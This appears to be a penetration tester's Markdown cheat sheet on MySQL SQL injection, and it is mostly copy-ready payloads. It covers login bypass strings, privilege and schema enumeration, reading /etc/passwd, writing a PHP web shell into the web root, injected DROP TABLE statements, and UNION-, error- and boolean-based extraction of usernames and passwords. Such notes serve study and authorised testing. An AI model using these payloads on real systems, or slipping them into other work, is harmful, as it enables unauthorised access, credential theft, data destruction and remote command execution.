## MySQL
### syntax cheatsheets 
- https://gist.github.com/bradtraversy/c831baaad44343cc945e76c2e30927b3
- https://devhints.io/mysql

### injection cheatsheets
- https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet 


## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |



## How to detect SQL injection vulnerabilities
- Submitting the single quote character `'` and looking for errors or other anomalies
- Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
- Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
- Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
- Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.
- [detection list](https://github.com/kiro6/penetration-testing-notes/blob/main/web%20pentest/Sql%20Injection/detect_prefixes.txt)

## sqli types source [sqli module htb academy](https://academy.hackthebox.com/module/details/33) 
![types_of_sqli](https://github.com/kiro6/penetration-testing-notes/assets/57776872/494a904c-156d-4d61-a25a-f94f7be0c650)


## SQL injection in different parts of the query

- Most SQL injection vulnerabilities arise within the WHERE clause of a SELECT query
- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause


#### sqli in WHERE clause of a SELECT query
```mysql
SELECT password from users where username='input_from user' ; 
```
- can be like this :
```mysql
SELECT password from users where username='unexisting_user' OR PAYLOAD -- ' ;

SELECT password from users where username='existing_user' AND PAYLOAD -- ' ;
```
#### sqli in UPDATE statements, within the updated values or the WHERE clause.
```mysql
UPDATE users SET email = 'user_input' WHERE username = 'user_input';
```
- can be like this :
```mysql
UPDATE users SET password = 'new_password' WHERE username = '' OR username='victim_username' --

UPDATE users SET password = 'new_password' WHERE username='victim_username' --  WHERE username = 'attacker_username';
```
#### sqli in INSERT statements, within the inserted values
```mysql
INSERT INTO comments (username, comment_text) VALUES ('user_input', 'new_comment_value');
```
- can be like this :
```mysql
INSERT INTO comments (username, comment_text) VALUES (''); DROP TABLE important_table; --', 'new_comment_value');

INSERT INTO comments (username, comment_text) VALUES (''); SELECT important_data FROM important_table; --', 'new_comment_value');
```
#### sqli in  SELECT statements, within the table or column name. 
```mysql
SELECT 'input_from user' FROM shop-products 
```
- can be like this :
```mysql
SELECT '1' UNION SELECT PAYLOAD -- ' FROM shop-products
```
#### sqli in SELECT statements, within the ORDER BY clause
```mysql
SELECT * FROM products ORDER BY user_input_column user_input_direction;
```
- can be like this :
```
SELECT * FROM products ORDER BY product_name; DROP TABLE products; ASC;

```



## Database Enumeration
```mysql
#Version
SELECT @@version   

# Current User
SELECT user();
SELECT system_user();

# List Users
SELECT user FROM mysql.user;    => need priv

# List Password Hashes
SELECT host, user, password FROM mysql.user;    => priv

# Current Database
SELECT database()
```

- information_schema.schemata => This table contains information about all the schemas (databases) present in the MySQL server
```mysql
SELECT schema_name, default_character_set_name
FROM information_schema.schemata;
```
- information_schema.tables => This table contains information about all the tables in all the schemas (databases) of the MySQL server
```mysql
SELECT table_schema, table_name, table_type
FROM information_schema.tables;
```
- information_schema.columns => This table contains information about all the columns within all the tables in all the schemas (databases) of the MySQL server
```mysql
SELECT table_schema, table_name, column_name, data_type
FROM information_schema.columns;
```

```mysql
# List Databases
SELECT schema_name FROM information_schema.schemata; 

# list all tables
SELECT table_name  FROM information_schema.tables;
SELECT table_name  FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ;

# list all tables in specfic databse (ex:secret)
SELECT table_name  FROM information_schema.tables WHERE table_schema = 'secret' ;

# Find Tables From Column Name (ex:username)
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';

# List all Columns 
SELECT table_schema, table_name, column_name FROM information_schema.columns ; 
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'

# List all Columns in specfic databse (ex:secret)
SELECT  table_name, column_name FROM information_schema.columns WHERE table_schema = 'secret'

# List all Columns in specfic table (ex:users)
SELECT table_schema, column_name FROM information_schema.columns WHERE table_name = 'users' 


```

## UNION BASED
### Determining the number of columns
```
1' ORDER BY 3--+	#True
1' ORDER BY 4--+	#False => Query is only using 3 columns OR ERROR

1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False => Query is only using 3 columns OR ERROR

' UNION SELECT NULL,NULL,NULL--       #False OR ERROR
' UNION SELECT NULL,NULL,NULL,NULL--  #True Query is only using 4 columns
```
- note the unioned data types in each column must be compatible between the original

### Finding columns with a useful data type
if unioned data type is the same as orginal the the application's response will contain some additional content including the injected string value
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
### Retrieve Interesting Data
```mysql
# retrive data
' UNION SELECT username, password FROM users--

# retrive data in single column
' UNION SELECT CONCAT(username,"~",password) FROM users--
```

## Error Based 

#### UpdateXML function
```mysql

#change data_offset to search values => 0.1,2,3,4,...
# you can change this databases with any database you want to get its values  

# get version
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)
# output => XPATH syntax error: '10.4.28-MariaDB'

# get databases
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null) 
# output => XPATH syntax error: ':~company~'

# get tables in specfic database
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)
# output =>  XPATH syntax error: ':~users~'

# get columns in specfic table 
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)
# output =>  XPATH syntax error: ':~passwords~'

# get values from column
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)
# output =>  XPATH syntax error: ':~adminadmin~'


# shorter version
and updatexml(null,concat(0x0a,version()),null)
and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null) # you can modify this to get everything

```

#### Extractvalue function
```mysql
#change data_offset to search values => 0.1,2,3,4,...
# you can change this databases with any database you want to get its values  

# get version
AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))
# output => XPATH syntax error: '10.4.28-MariaDB'

# get database
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
# output => XPATH syntax error: ':~company~'

# get tables in specfic database
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
# output =>  XPATH syntax error: ':~users~'

# get columns in specfic table 
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
# output =>  XPATH syntax error: ':~passwords~'

# get values from column
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
# output =>  XPATH syntax error: ':~adminadmin~'

# shorter version
AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))
AND EXTRACTVALUE(1, CONCAT(0x5c, (select table_name from information_schema.tables where table_schema=database() LIMIT 0,1))) #you can modify this to get everything

```


## Boolean Based
- we make conditional queries if the server return response so it is true , using this technique we can make condtional queries to check (values,columns, tables, databases)   
- the server will not return server error or somthing like this but there will be different in the response , like word that appear only when the query is true 
- example
```mysql
…xyz' AND '1'='1  # True  => return result
…xyz' AND '1'='2  # False => do not return result
```
### substring method 
```mysql
# check if the table name starts char less than `m` using where clause 
AND SUBSTRING((select table_name from information_schema.tables where table_schema=database()), 1, 1) < 'm' ; # you can modify this to get everything

# check if the table name starts char less than `m` using limit
AND SUBSTRING((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1 ), 1, 1) < 'm' ; # you can modify this to get everything
```
#### methodology
```mysql
#-----------------------------------------------------------------------------------------------
# change offset to 0,1,2,3,4 to get different users

# check for condtiomal responses
existing_value' AND '1'='2


# you can get databases,tables,columns names values as the same technique as username and password down , using information_schema

# check column value if true
existing_value' AND (SELECT 'a' FROM users WHERE username)='a


# get username length
existing_value' AND (SELECT 'a' FROM users WHERE LENGTH(username)>2 limit offset,1)='a

# get usernames values 
existing_value' AND (SELECT SUBSTRING(username,1,1) FROM users limit offset,1)='a    


# check username value if true
existing_value' AND (SELECT 'a' FROM users WHERE username='administrator')='a

# get password length
existing_value' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a

# get password value
existing_value' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
